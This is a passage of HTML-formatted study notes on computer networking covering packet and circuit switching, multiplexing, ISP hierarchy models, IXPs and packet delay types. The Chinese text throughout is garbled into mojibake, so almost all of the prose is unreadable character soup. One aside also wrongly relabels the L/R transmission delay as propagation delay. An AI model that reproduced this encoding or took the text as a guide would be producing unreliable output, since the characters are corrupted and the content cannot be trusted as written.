çº¿ç”µä¿¡é“æ‰¿è½½ç”µç£é¢‘è°±ä¸­çš„ä¿¡å·ï¼Œ<strong>ä¸éœ€è¦ç‰©ç†çº¿è·¯</strong>ï¼Œæä¾›ä¸ç§»åŠ¨ç”¨æˆ·çš„è¿æ¥ä»¥åŠé•¿è·ç¦»æ‰¿è½½ä¿¡å·çš„æ–¹å¼ï¼›æ˜¯ä¸€ç§æœ‰å¸å¼•åŠ›çš„åª’ä½“ï¼›</li><li><strong>å«æ˜Ÿæ— çº¿ç”µé¢‘è°±satellite radio spectrum:</strong> é€šè¿‡å«æ˜Ÿè¿æ¥ä¸¤ä¸ªæˆ–å¤šä¸ªåœ¨åœ°çƒä¸Šçš„å¾®æ³¢å‘å°„æ–¹ï¼ˆä¹Ÿè¢«ç§°ä¸ºåœ°é¢ç«™ï¼‰ï¼Œè¯¥å«æ˜Ÿåœ¨ä¸€ä¸ªé¢‘æ®µä¸Šæ¥æ”¶ä¿¡å·ï¼Œåœ¨å¦ä¸€ä¸ªé¢‘æ®µä¸Šå‘é€ä¿¡å·ï¼›ç§ç±»æœ‰åŒæ­¥å«æ˜Ÿå’Œè¿‘åœ°è½¨é“å«æ˜Ÿï¼›</li></ul></li></ul><h3 id="ç½‘ç»œæ ¸å¿ƒ"><a href="#ç½‘ç»œæ ¸å¿ƒ" class="headerlink" title="ç½‘ç»œæ ¸å¿ƒ"></a>ç½‘ç»œæ ¸å¿ƒ</h3><ul><li>åœ¨è€ƒå¯Ÿäº†å› ç‰¹ç½‘è¾¹ç¼˜ä¹‹åï¼Œå¼€å§‹æ·±å…¥ç ”ç©¶ç½‘ç»œæ ¸å¿ƒï¼Œä¹Ÿå°±æ˜¯<strong>äº’è”ç½‘ç«¯ç³»ç»Ÿçš„åˆ†ç»„äº¤æ¢æœºå’Œé“¾è·¯æ„æˆçš„ç½‘çŠ¶ç½‘æ ¼</strong>ã€‚Figure 1.10</li><li>é€šè¿‡ç½‘ç»œé“¾è·¯å’Œäº¤æ¢æœºç§»åŠ¨æ•°æ®æœ‰ä¸¤ç§åŸºæœ¬æ–¹æ³•ï¼š<strong>ç”µè·¯äº¤æ¢å’Œåˆ†ç»„äº¤æ¢</strong></li></ul><h4 id="åˆ†ç»„äº¤æ¢ï¼š"><a href="#åˆ†ç»„äº¤æ¢ï¼š" class="headerlink" title="åˆ†ç»„äº¤æ¢ï¼š"></a>åˆ†ç»„äº¤æ¢ï¼š</h4><ul><li>åˆ†ç»„åœ¨é€šä¿¡é“¾è·¯ä¸Šä»¥<strong>ç­‰äºè¯¥é“¾è·¯çš„æœ€å¤§ä¼ è¾“é€Ÿç‡</strong>ä¼ è¾“é€šè¿‡é€šä¿¡é“¾è·¯ã€‚</li><li><strong>ä¼ è¾“æ—¶å»¶ï¼ˆåº”è¯¥æ˜¯ä¼ æ’­æ—¶å»¶ï¼‰ï¼š</strong> å¦‚æœæŸæ¡é“¾è·¯çš„æœ€å¤§ä¼ è¾“é€Ÿç‡ä¸º<strong>Ræ¯”ç‰¹/ç§’</strong>ï¼Œåˆ†ç»„é•¿åº¦ä¸º<strong>Læ¯”ç‰¹</strong> ï¼Œåˆ™è¯¥é“¾è·¯ä¼ è¾“è¯¥åˆ†ç»„çš„æ—¶é—´ä¸º<strong>L/Rç§’</strong>ã€‚</li><li><strong>å­˜å‚¨è½¬å‘ä¼ è¾“ï¼š</strong> å­˜å‚¨è½¬å‘æ˜¯æŒ‡äº¤æ¢æœºåœ¨<strong>æ”¶åˆ°ä¸€ä¸ªå®Œæˆçš„åˆ†ç»„</strong>ï¼Œæ‰ä¼šå‘é“¾è·¯è¾“å‡ºè½¬å‘åˆ†ç»„ï¼Œå¦åˆ™å°±å°†æ”¶åˆ°çš„éƒ¨åˆ†åˆ†ç»„ç¼“å­˜èµ·æ¥ï¼›å› ä¸º<strong>ç¼“å­˜ç­‰å¾…ä¸€ä¸ªåˆ†ç»„çš„å…¨éƒ¨æ•°æ®</strong>è€Œå¯¼è‡´çš„æ—¶é—´å¼€é”€è¢«ç§°ä¸º<strong>å­˜å‚¨è½¬å‘æ—¶å»¶</strong><ul><li>å› ä¸ºéœ€è¦ç¼“å­˜åˆ†ç»„ï¼Œæ‰€ä»¥æ­¤æ—¶åˆ†ç»„äº¤æ¢æœºéœ€è¦ä¸€ä¸ª<strong>ç¼“å†²é˜Ÿåˆ—</strong>ï¼›</li></ul></li><li><strong>æ’é˜Ÿæ—¶å»¶ä¸åˆ†ç»„ä¸¢å¤±ï¼š</strong><ul><li>å› ä¸ºéœ€è¦ç¼“å­˜åˆ†ç»„ï¼Œæ‰€ä»¥æ­¤æ—¶åˆ†ç»„äº¤æ¢æœºéœ€è¦ä¸€ä¸ª<strong>è¾“å‡ºç¼“å­˜</strong>å’Œï¼Œä¹Ÿç§°ä¸º<strong>è¾“å‡ºé˜Ÿåˆ—</strong>ï¼›<strong>ç¼“å†²é˜Ÿåˆ—çš„ç©ºé—´æœ‰é™æ€§</strong>å°±æœ‰å¯èƒ½å¯¼è‡´åˆ†ç»„äº¤æ¢æœºæ— æ³•ç»§ç»­ç¼“å­˜åˆ†ç»„ï¼ˆå› ä¸ºé“¾è·¯è¢«å ç”¨ï¼ˆè¯¥é“¾è·¯æ­£å¿™äºä¼ è¾“å…¶ä»–åˆ†ç»„ï¼‰æˆ–è€…åˆ†ç»„è¿˜æ²¡å…¨éƒ¨åˆ°ä½ï¼‰è€Œä½¿åˆ°è¾¾åˆ†ç»„äº¤æ¢æœºçš„æ•°æ®åŒ…<strong>è¢«è¿«ä¸¢å¼ƒï¼ˆåˆ†ç»„ä¸¢å¤±ï¼‰ï¼ˆä¸¢åŒ…ï¼‰</strong>ï¼›è¿™å°±å¯¼è‡´äº†åˆ†ç»„<strong>ä¸ä½†æ‰¿æ‹…äº†å­˜å‚¨è½¬å‘ä¼ è¾“æ—¶å»¶ï¼Œè¿˜æ‰¿æ‹…äº†æ’é˜Ÿæ—¶å»¶</strong>ã€‚è¿™äº›æ—¶å»¶æ˜¯å˜åŒ–çš„ï¼Œå˜åŒ–çš„ç¨‹åº¦å–å†³äºç½‘ç»œçš„æ‹¥å¡ç¨‹åº¦ã€‚</li></ul></li><li><strong>è½¬å‘è¡¨ä¸è·¯ç”±é€‰æ‹©åè®®ï¼š</strong><ul><li>å®é™…ä¸Šï¼Œåˆ†ç»„äº¤æ¢æœºä¹‹æ‰€ä»¥èƒ½å¤ŸçŸ¥é“å¾€å“ªå»æ˜¯å› ä¸ºå…¶å†…éƒ¨æœ‰ä¸€ä¸ª<strong>è½¬å‘è¡¨</strong>ï¼Œè¿™ä¸ªè¡¨ç»´æŠ¤äº†ä¸€ä¸ªIPåœ°å€å’Œé“¾è·¯çš„å¯¹åº”å…³ç³»ï¼Œæ‰€ä»¥å¤„ç†æµç¨‹ä¸ºï¼š<ul><li>é€šè¿‡<strong>åˆ†ç»„çš„å¿…è¦ä¿¡æ¯</strong>ï¼Œè·å¾—ç›®çš„ç«¯ç³»ç»Ÿçš„<strong>IPåœ°å€</strong> </li><li>é€šè¿‡<strong>IPåœ°å€ç´¢å¼•è½¬å‘è¡¨</strong>ï¼Œä»è€Œç¡®å®šè¾“å‡ºé“¾è·¯</li></ul></li></ul></li></ul><h4 id="ç”µè·¯äº¤æ¢ï¼š"><a href="#ç”µè·¯äº¤æ¢ï¼š" class="headerlink" title="ç”µè·¯äº¤æ¢ï¼š"></a>ç”µè·¯äº¤æ¢ï¼š</h4><ul><li><p>åœ¨<strong>ç”µè·¯äº¤æ¢ç½‘ç»œ</strong>ä¸­ï¼Œåœ¨ç«¯ç³»ç»Ÿé€šä¿¡ä¼šè¯æœŸé—´ï¼Œäº¤æ¢æœºä¼š<strong>é¢„ç•™</strong>ç«¯ç³»ç»Ÿé—´é€šä¿¡è·¯å¾„ä¸Šçš„ç›¸å…³èµ„æºï¼ˆç¼“å­˜ï¼Œé“¾è·¯ä¼ è¾“é€Ÿç‡ï¼‰ï¼Œå³<strong>å…ˆå»ºç«‹è¿æ¥ï¼Œç„¶åé€šä¿¡</strong>ï¼›è€Œåœ¨<strong>åˆ†ç»„äº¤æ¢ç½‘ç»œä¸­ï¼Œè¿™äº›èµ„æºæ²¡æœ‰è¢«é¢„ç•™</strong>ï¼›ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ç«¯ç³»ç»Ÿè¿›è¡Œé€šä¿¡æ—¶ï¼Œå…¶æ‰€éœ€è¦çš„èµ„æºæ˜¯<strong>è¢«ä¿æŒ</strong>çš„ï¼Œå…¶ä»–é€šä¿¡æ˜¯æ— æ³•ä½¿ç”¨è¿™ä¸€éƒ¨åˆ†èµ„æºçš„ï¼›ä¹Ÿå°±è¯´ï¼Œç«¯ç³»ç»Ÿé—´çœŸæ­£å»ºç«‹äº†ä¸€æ¡â€œè¿æ¥â€ï¼›è€Œè¿™ä¸€è¿æ¥ï¼Œç”¨ç”µè¯çš„æœ¯è¯­è¢«ç§°ä¸ºâ€œç”µè·¯â€ã€‚ä¼ ç»Ÿçš„ç”µè¯ç½‘ç»œå°±æ˜¯ç”µè·¯äº¤æ¢ç½‘ç»œçš„ä¾‹å­ã€‚</p></li><li><p>ç”µè·¯äº¤æ¢ç½‘ç»œä¸­çš„å¤ç”¨ï¼š</p><ul><li><strong>æ—¶åˆ†å¤ç”¨ï¼ˆTime-Division Multiplexing TDMï¼‰ï¼š</strong> æ˜¯æŒ‡å°†æ—¶é—´åˆ’åˆ†ä¸º<strong>å›ºå®šåŒºé—´çš„å¸§</strong>ï¼Œæ¯ä¸ªå¸§åˆ™åˆè¢«åˆ’åˆ†ä¸ºå›ºå®šæ•°é‡çš„<strong>æ—¶é—´ç©ºéš™</strong>ï¼›å½“ç½‘ç»œéœ€è¦å»ºç«‹ä¸€æ¡è¿æ¥æ—¶ï¼Œç½‘ç»œå°†åœ¨æ¯ä¸ªå¸§ä¸­ä¸ºè¯¥è¿æ¥æŒ‡å®šä¸€ä¸ªæ—¶éš™ï¼›åœ¨è¯¥æ—¶éš™å†…ï¼Œé“¾è·¯ç”¨æ¥ä¼ è¾“è¯¥é“¾æ¥çš„æ•°æ®ï¼›</li><li><strong>é¢‘åˆ†å¤ç”¨(Frequency-Division Multiplexing)ï¼š</strong> å°†é¢‘ç‡åŸŸåˆ’åˆ†ä¸ºé¢‘æ®µï¼Œç„¶åå°†<strong>é¢‘æ®µ</strong>åˆ†é…ç»™è¿æ¥ï¼›æ­¤é¢‘æ®µè¢«ç”¨æ¥ä¸“é—¨ä¼ è¾“é“¾æ¥çš„æ•°æ®ã€‚è¯¥é¢‘æ®µçš„å®½åº¦æˆä¸ºå¸¦å®½ã€‚</li></ul></li><li><p><strong>åˆ†ç»„äº¤æ¢å’Œç”µè·¯äº¤æ¢çš„å¯¹æ¯”ï¼š</strong></p><ul><li><strong>åˆ†ç»„äº¤æ¢çš„ä¼˜ç‚¹ï¼š</strong><ul><li>å®ƒæä¾›äº†æ¯”ç”µè·¯äº¤æ¢æ›´å¥½çš„å¸¦å®½å…±äº«ï¼›</li><li>å®ƒæ¯”ç”µè·¯äº¤æ¢æ›´ç®€å•ã€æ›´æœ‰æ•ˆã€å®ç°æˆæœ¬æ›´ä½ï¼›</li></ul></li><li><strong>åˆ†ç»„äº¤æ¢çš„ç¼ºç‚¹:</strong><ul><li>åˆ†ç»„äº¤æ¢<strong>ä¸é€‚åˆå®æ—¶æœåŠ¡</strong>ï¼Œå› ä¸ºç«¯åˆ°ç«¯çš„<strong>æ—¶å»¶æ˜¯å¯å˜ã€ä¸å¯é¢„æµ‹çš„</strong>ï¼Œè¿™å’Œæ•´ä¸ªç½‘ç»œçš„æƒ…å†µç›¸å…³ï¼›</li></ul></li><li><strong>ç”µè·¯äº¤æ¢çš„ä¼˜ç‚¹ï¼š</strong><ul><li>æä¾›äº†ç«¯å¯¹ç«¯ä¼ è¾“æ•°æ®çš„é€Ÿç‡ä¿è¯ï¼›</li></ul></li><li><strong>ç”µè·¯äº¤æ¢çš„ç¼ºç‚¹</strong>ï¼š<ul><li>ç”µè·¯äº¤æ¢å­˜åœ¨é™é»˜æœŸï¼Œè¿™æ˜¯æŒ‡ä¸“ç”¨ç”µè·¯ç©ºé—²æ—¶ï¼Œå…¶å ç”¨çš„èµ„æºå¹¶æ²¡æœ‰å¾—åˆ°å……åˆ†çš„åˆ©ç”¨ï¼›</li><li>å»ºç«‹è¿æ¥çš„è¿‡ç¨‹æ¯”è¾ƒå¤æ‚ï¼›</li></ul></li><li><strong>æ€»ç»“ï¼š</strong> æ€»ä½“ä¸Šæ¥è¯´ï¼Œ<strong>åˆ†ç»„äº¤æ¢çš„æ€§èƒ½è¦å¥½äºç”µè·¯äº¤æ¢çš„æ€§èƒ½</strong>ï¼Œä½†æ˜¯ä¸åŒç±»å‹çš„åˆ†ç»„äº¤æ¢æ–¹å¼æœ‰ä¸åŒçš„åº”ç”¨åœºæ™¯ï¼›æ¯”å¦‚ä¸€äº›å¯¹æœ€ä½é€Ÿç‡æœ‰ç€ä¸¥æ ¼è¦æ±‚çš„åº”ç”¨ï¼Œæ¯”å¦‚å®æ—¶æœåŠ¡ç­‰ï¼Œä¸ºäº†è·å¾—é€Ÿç‡ä¿è¯ï¼Œç‰ºç‰²ç½‘ç»œçš„æ•ˆç‡ä¹Ÿæ˜¯å¯ä»¥æ¥å—çš„ã€‚è¶‹åŠ¿å‘ç€åˆ†ç»„äº¤æ¢å‘å±•ç½‘ç»œçš„ç½‘ç»œ</li></ul></li></ul><h4 id="ç½‘ç»œçš„ç½‘ç»œï¼š"><a href="#ç½‘ç»œçš„ç½‘ç»œï¼š" class="headerlink" title="ç½‘ç»œçš„ç½‘ç»œï¼š"></a>ç½‘ç»œçš„ç½‘ç»œï¼š</h4><ul><li><p>è¯¥ç”¨ä»€ä¹ˆæ ·çš„ç»“æ„æ¥åˆ»ç”»å› ç‰¹ç½‘å‘¢ï¼Ÿ<strong>å› ç‰¹ç½‘</strong>æ˜¯ç½‘ç»œçš„ç½‘ç»œ</p></li><li><p>é€šè¿‡5ä¸ªæ¨¡å‹ä¸æ–­è¿‡æ¸¡åˆ°æœ€ç»ˆæ¨¡å‹ï¼Œå…¶å®è¿‡æ¸¡çš„è¿‡ç¨‹å°±ç»“æ„ä¸æ–­åˆç†ã€è¿æ¥æ–¹å¼ä¸æ–­æ˜ç¡®çš„è¿‡ç¨‹</p></li><li><p>ç«¯ç³»ç»Ÿæ˜¯é€šè¿‡<strong>ISPæ¥å…¥å› ç‰¹ç½‘</strong>çš„ï¼Œ<strong>ä¸ºäº†å®ç°ç«¯ç³»ç»Ÿçš„äº’è”ï¼ŒISPä¹Ÿå¿…é¡»äº’è”</strong>ï¼Œå…¶å®ç½‘ç»œæ¨¡å‹å°±æ˜¯ç”¨æ¥<strong>è¡¨è¾¾ISPå’Œç«¯ç³»ç»Ÿä»¥åŠISPä¹‹é—´çš„ç»“æ„çš„æŠ½è±¡ã€‚</strong></p></li><li><p><strong>ç½‘ç»œç»“æ„1ï¼š</strong> <strong>å­˜åœ¨å”¯ä¸€çš„å…¨çƒä¼ è¾“ISPäº’è”æ‰€æœ‰çš„æ¥å…¥ISP</strong>ï¼Œè¿™æ˜¯æŒ‡ï¼Œå…¨çƒISPæ˜¯ä¸€ä¸ªç”±è·¯ç”±å™¨å’Œé€šä¿¡é“¾è·¯æ„æˆçš„ç½‘ç»œï¼Œè¯¥ç½‘ç»œè·¨è¶Šå…¨çƒï¼Œå¹¶ä¸”å…¶ä»–çš„æ¥å…¥ISPéƒ½è‡³å°‘å’Œä¸€ä¸ªå®ƒçš„è·¯ç”±å™¨ç›¸è¿ï¼ˆ<strong>æ¥å…¥ISPè¢«è®¤ä¸ºæ˜¯å®¢æˆ·</strong>ï¼Œ<strong>å…¨çƒä¼ è¾“è¢«è®¤ä¸ºæ˜¯æä¾›å•†</strong>ï¼‰ï¼›</p></li><li><p><strong>ç½‘ç»œç»“æ„2ï¼š</strong> <strong>å­˜åœ¨å¤šä¸ªå…¨çƒä¼ è¾“ISP</strong>ï¼Œå®ƒä»¬åˆ†åˆ«äºä¸€éƒ¨åˆ†çš„æ¥å…¥ISPäº’è”ï¼›ä¸ºäº†å®ç°ç«¯ç³»ç»Ÿçš„äº’è”ï¼Œè¿™å¤šä¸ªå…¨çƒISPä¹Ÿå¿…é¡»äº’è”ï¼›ç½‘ç»œç»“æ„æ˜¯ä¸€ä¸ªä¸¤å±‚ç»“æ„ï¼Œå…¶ä¸­<strong>å…¨çƒä¼ è¾“ISPä½äºé¡¶å±‚</strong>ï¼Œ<strong>æ¥å…¥ISPå¤„äºåº•å±‚</strong>ï¼›</p></li><li><p><strong>ç½‘ç»œç»“æ„3ï¼š</strong> <strong>é¡¶å±‚å…¨çƒä¼ è¾“ISPåŸºæœ¬ä¸Šå·²ç»å®šå‹</strong>ï¼Œä½†æ˜¯æ¥å…¥ISPç°åœ¨è¿˜å¾ˆæ··ä¹±ï¼Œæ¯”å¦‚ï¼Œå®ƒä»¬ç›´æ¥åŒé¡¶å±‚ISPç›¸è¿ï¼›è€Œç½‘ç»œç»“æ„3ä¸­ï¼Œ<strong>æ¥å…¥ISPä¹Ÿæ˜¯åˆ†å±‚çš„</strong>ï¼šè¾ƒå°åŒºåŸŸä¸­çš„ISPè¿å…¥è¾ƒå¤§åŒºåŸŸçš„ISPï¼Œè€Œä¸æ˜¯ç›´æ¥ä¸é¡¶å±‚ISPç›¸è¿ï¼›ä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™æ ·çš„ç»“æ„å‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºï¼Œå¦‚æœéƒ½ç›´æ¥åŒé¡¶å±‚ISPç›¸è¿ï¼Œé‚£ä¹ˆä¸¤ä¸ªåŒä¸€è¾ƒå°åŒºåŸŸå†…ï¼Œåˆ†å±ä¸åŒISPçš„ç«¯ç³»ç»Ÿä¹‹é—´é€šä¿¡çš„æ•°æ®ä¹Ÿä¼šåˆ°é¡¶å±‚ISPä¸­å¿ƒå»ä¸€è¶Ÿï¼Œå¦‚æœå®ƒä»¬ä¸æ˜¯ç›´æ¥æ¥å…¥é¡¶å±‚ISPï¼Œè€Œæ˜¯æ¥å…¥äº†ä¸€ä¸ªè¾ƒå¤§åŒºåŸŸçš„ISPï¼Œé‚£ä¹ˆå®ƒä»¬ä¹‹é—´çš„é€šä¿¡æ•°æ®å°±ä¸ç”¨å»é¡¶å±‚ISPä¸­å¿ƒäº†ï¼Œå› ä¸ºå®ƒä»¬é€šè¿‡è¾ƒå¤§åŒºåŸŸçš„ISPå·²ç»å®ç°äº†äº’è¿ï¼Œæ‰€ä»¥é€šä¿¡é€Ÿåº¦è‚¯å®šå°±ä¸Šå»äº†ã€‚</p></li><li><p><strong>ç½‘ç»œç»“æ„4</strong>: æ˜¯åœ¨ç½‘ç»œç»“æ„3çš„åŸºç¡€ä¸Šï¼Œå¢åŠ äº†ä»¥ä¸‹ç‰¹ç‚¹è€Œå½¢æˆçš„ç»“æ„ï¼š<strong>å­˜åœ¨ç‚¹</strong>ï¼ˆPoint of Presenceï¼Œ<strong>PoP</strong>ï¼‰ã€<strong>å¤šå®¿</strong>ã€<strong>å¯¹ç­‰</strong>ã€<strong>å› ç‰¹ç½‘äº¤æ¢ç‚¹</strong>ï¼ˆInternet exchange pointï¼Œ<strong>IXP</strong>ï¼‰ã€‚</p><ul><li><strong>PoPï¼š</strong> å­˜åœ¨äºç­‰çº§ç»“æ„ä¸­æ‰€æœ‰å±‚æ¬¡ï¼Œä½†æ˜¯åº•å±‚ISPé™¤å¤–ï¼›<strong>ä¸€ä¸ªPoPæ˜¯ISPç½‘ç»œä¸­çš„ä¸€å°æˆ–è€…å¤šå°è·¯ç”±å™¨ç¾¤ç»„</strong>ï¼Œå…¶ä¸­å®¢æˆ·ISPèƒ½å¤Ÿé€šè¿‡ç¬¬ä¸‰æ–¹<strong>æä¾›çš„é«˜é€Ÿé“¾è·¯ç›´æ¥å°†å®ƒçš„è·¯ç”±å™¨å’Œä¾›åº”å•†çš„PoPè¿æ¥</strong>ï¼Œä»è€Œå®ç°ä¸æä¾›å•†ISPè¿æ¥ã€‚è¿™æ ·æ¥å…¥é€Ÿåº¦å¾ˆæ˜æ˜¾å°±æé«˜äº†ã€‚</li><li><strong>å¤šå®¿ï¼ˆmulti-homeï¼‰ï¼š</strong> ä»»ä½•ISPï¼ˆé™¤ç¬¬ä¸€å±‚ISPï¼‰éƒ½å¯ä»¥ä¸<strong>ä¸¤ä¸ªæˆ–è€…å¤šä¸ªæä¾›å•†ISPè¿æ¥</strong>ï¼Œè¿™è¢«ç§°ä¸º<strong>å¤šå®¿</strong>ï¼›è¿™æ ·ç½‘ç»œçš„<strong>å¯é æ€§</strong>å°±æé«˜äº†ã€‚</li><li><strong>å¯¹ç­‰ï¼ˆpeerï¼‰ï¼š</strong> ä½äº<strong>ç›¸åŒç­‰çº§ç»“æ„å±‚æ¬¡çš„ä¸€å¯¹é‚»è¿‘ISPèƒ½å¤Ÿç›´æ¥å°†å®ƒä»¬çš„ç½‘ç»œè¿æ¥åˆ°ä¸€èµ·</strong>ï¼Œä½¿å®ƒä»¬ä¹‹é—´æµé‡ç»ç›´æ¥è¿æ¥è€Œä¸<strong>æ˜¯ç»è¿‡ä¸Šæ¸¸çš„ä¸­é—´ISPä¼ è¾“</strong>ï¼Œè¿™æ ·æ—¢ä¸ç”¨ä»˜è´¹ï¼Œé€Ÿåº¦ä¹Ÿå¯èƒ½ä¼šå¿«ä¸€äº›</li><li><strong>IXPï¼š</strong> å› ç‰¹ç½‘äº¤æ¢ç‚¹æ˜¯ä¸ºäº†å®ç°å¤šä¸ªISP<strong>å¯ä»¥å¯¹ç­‰</strong>è€Œåˆ›å»ºçš„ã€‚</li></ul></li><li><p><strong>ç½‘ç»œç»“æ„5ï¼š</strong> ç½‘ç»œç»“æ„5æ˜¯åœ¨ç½‘ç»œç»“æ„4çš„åŸºç¡€ä¸Š<strong>å¢åŠ äº†å†…å®¹æä¾›å•†ç½‘ç»œ</strong>è€Œæ„æˆã€‚å†…å®¹æä¾›å•†æ„å»ºè‡ªå·±çš„ç½‘ç»œï¼Œå¹¶ä¸”<strong>é€šè¿‡ä¸è¾ƒä½å±‚ISPå¯¹ç­‰è€Œâ€œç»•è¿‡â€è¾ƒé«˜å±‚å› ç‰¹ç½‘ISP</strong>ï¼Œè€Œä¸”å†…å®¹æä¾›å•†å¯¹ç«¯ç”¨æˆ·ä¹Ÿæœ‰äº†æ›´å¤šçš„æ§åˆ¶ã€‚</p><img src="../../image/Computer_Networking/image-20220116215250646.png" alt="image-20220116215250646" style="zoom:67%;" /></li><li><p>æ€»ä½“æ¥è¯´ï¼Œä»Šå¤©çš„å› ç‰¹ç½‘æ˜¯ä¸€ä¸ªâ€œç½‘ç»œçš„ç½‘ç»œâ€ï¼Œå…¶ç»“æ„å¤æ‚ï¼Œç”±åå¤šä¸ªé¡¶å±‚ISPå’Œæ•°åä¸‡ä¸ªè¾ƒä½å±‚ISPæ„æˆã€‚è¿‘å¹´æ¥ï¼Œ<strong>ä¸»è¦çš„å†…å®¹æä¾›å•†åˆ›å»ºè‡ªå·±çš„ç½‘ç»œï¼Œç›´æ¥åœ¨å¯èƒ½çš„åœ°æ–¹ä¸è¾ƒä½å±‚ISPäº’è”.</strong></p></li></ul><h3 id="åˆ†ç»„äº¤æ¢ä¸­çš„æ—¶å»¶ã€ä¸¢åŒ…ã€ååé‡"><a href="#åˆ†ç»„äº¤æ¢ä¸­çš„æ—¶å»¶ã€ä¸¢åŒ…ã€ååé‡" class="headerlink" title="åˆ†ç»„äº¤æ¢ä¸­çš„æ—¶å»¶ã€ä¸¢åŒ…ã€ååé‡:"></a>åˆ†ç»„äº¤æ¢ä¸­çš„æ—¶å»¶ã€ä¸¢åŒ…ã€ååé‡:</h3><ul><li><p>å› ç‰¹ç½‘èƒ½å¤Ÿçœ‹æˆæ˜¯ä¸€ç§åŸºç¡€è®¾æ–½ï¼Œè¯¥åŸºç¡€è®¾æ–½ä¸ºè¿è¡Œåœ¨ç«¯ç³»ç»Ÿä¸Šçš„åˆ†å¸ƒå¼åº”ç”¨æä¾›æœåŠ¡ã€‚</p></li><li><p><strong>ç†æƒ³ç›®æ ‡</strong>ï¼šå› ç‰¹ç½‘èƒ½å¤Ÿåœ¨ä»»æ„ä¸¤ä¸ªç«¯ç³»ç»Ÿä¹‹é—´éšå¿ƒæ‰€æ¬²åœ°ç§»åŠ¨æ•°æ®è€Œæ²¡æœ‰ä»»ä½•æ•°æ®ä¸¢å¤±ï¼Œ<strong>è®¡ç®—æœºç½‘ç»œå¿…å®šè¦é™åˆ¶åœ¨ç«¯ç³»ç»Ÿä¹‹é—´çš„ååé‡ï¼ˆæ¯ç§’èƒ½å¤Ÿä¼ è¾“çš„æ•°æ®é‡ï¼‰ï¼Œåœ¨ç«¯ç³»ç»Ÿä¹‹é—´å¼•å…¥æ—¶å»¶ï¼Œè€Œä¸”å®é™…ä¸Šä¹Ÿä¼šä¸¢å¤±åˆ†ç»„</strong></p></li></ul><h4 id="åˆ†ç»„äº¤æ¢ç½‘ä¸­çš„æ—¶å»¶æ¦‚è¿°ï¼š"><a href="#åˆ†ç»„äº¤æ¢ç½‘ä¸­çš„æ—¶å»¶æ¦‚è¿°ï¼š" class="headerlink" title="åˆ†ç»„äº¤æ¢ç½‘ä¸­çš„æ—¶å»¶æ¦‚è¿°ï¼š"></a>åˆ†ç»„äº¤æ¢ç½‘ä¸­çš„æ—¶å»¶æ¦‚è¿°ï¼š</h4><ul><li>ä¸€ä¸ªåˆ†ç»„åœ¨æ²¿é€”æ¯ä¸ªèŠ‚ç‚¹<strong>æ‰¿å—ä¸åŒç±»å‹çš„æ—¶å»¶</strong>ï¼Œè¿™äº›æ—¶å»¶ä¸­æœ€ä¸ºé‡è¦çš„æ˜¯ï¼šç»“ç‚¹<strong>å¤„ç†æ—¶å»¶ã€æ’é˜Ÿæ—¶å»¶ã€ä¼ è¾“æ—¶å»¶</strong>å’Œ<strong>ä¼ æ’­æ—¶å»¶</strong>.è¿™äº›æ—¶å»¶æ€»ä½“ç´¯åŠ èµ·æ¥æ˜¯<strong>ç»“ç‚¹æ€»æ—¶å»¶</strong></li><li><strong>èŠ‚ç‚¹æ€»æ—¶å»¶==ç»“ç‚¹å¤„ç†æ—¶å»¶+æ’é˜Ÿæ—¶å»¶+ä¼ è¾“æ—¶å»¶+ä¼ æ’­æ—¶å»¶</strong></li><li><strong>æ—¶å»¶ç±»å‹ï¼š</strong><ul><li><strong>èŠ‚ç‚¹å¤„ç†æ—¶å»¶nodal processing delayï¼š</strong> æ˜¯å› ä¸ºèŠ‚ç‚¹éœ€è¦è§£æåˆ†ç»„çš„å¿…è¦ä¿¡æ¯ç„¶åå†³å®šæ˜¯å“ªä¸ªå‡ºé“¾è·¯ï¼ˆç´¢å¼•è½¬å‘è¡¨ç­‰æ“ä½œï¼‰è€Œäº§ç”Ÿçš„ï¼Œé€šå¸¸åœ¨å¾®ç§’æˆ–è€…æ›´ä½æ•°é‡çº§ï¼›</li><li><strong>æ’é˜Ÿæ—¶å»¶queuing delayï¼š</strong> æ˜¯å› ä¸ºåˆ†ç»„æ‰€å¯¹åº”çš„å‡ºé“¾è·¯å‰é¢æœ‰å…¶ä»–åˆ†ç»„æ­£åœ¨ä¼ è¾“ï¼Œæ‰€ä»¥åˆ†ç»„éœ€è¦è¯¥é“¾è·¯çš„ç¼“å†²é˜Ÿåˆ—é‡Œç­‰å¾…å…¶ä»–åˆ†ç»„ä¼ è¾“å®Œæ¯•è€Œäº§ç”Ÿçš„ï¼Œä¸€ä¸ªç‰¹å®šåˆ†ç»„çš„æ’é˜Ÿæ—¶å»¶é•¿åº¦å°†å–å†³äºå…ˆå‰åˆ°è¾¾çš„æ­£åœ¨æ’é˜Ÿç­‰å¾…å‘é“¾è·¯ä¼ è¾“çš„åˆ†ç»„æ•°é‡ã€‚æ’é˜Ÿæ—¶å»¶æ˜¯åˆ°è¾¾è¯¥é˜Ÿåˆ—çš„æµé‡å¼ºåº¦å’Œæ€§è´¨çš„å‡½æ•°ï¼Œé€šå¸¸å¯ä»¥è¾¾åˆ°æ¯«ç§’çº§åˆ°å¾®ç§’çº§ï¼›</li><li><strong>ä¼ è¾“æ—¶å»¶transmission delay(ä¸€ä¸ªåˆ†ç»„çš„èŠ‚ç‚¹å…¨éƒ¨è¿›å…¥é“¾è·¯çš„æ—¶å»¶)ï¼š</strong> ä¼ è¾“æ—¶å»¶æ˜¯å°†<strong>æ‰€æœ‰åˆ†ç»„çš„æ¯”ç‰¹æ¨å‘é“¾è·¯æ‰€æœ‰éœ€è¦çš„æ—¶é—´</strong>ï¼Œå®é™…çš„ä¼ è¾“æ—¶å»¶é€šå¸¸åœ¨æ¯«ç§’åˆ°å¾®ç§’æ•°é‡çº§ã€‚ç”¨Lè¡¨ç¤ºåˆ†ç»„çš„é•¿åº¦ï¼Œç”¨Rbpsè¡¨ç¤ºä»è·¯ç”±å™¨Aåˆ°Bçš„é“¾è·¯ä¼ è¾“é€Ÿç‡ã€‚ä¼ è¾“æ—¶å»¶æ˜¯L/Rã€‚</li><li><strong>ä¼ æ’­æ—¶å»¶propagation delay(é“¾è·¯ä¸­æ¶ˆè€—çš„)ï¼š</strong> 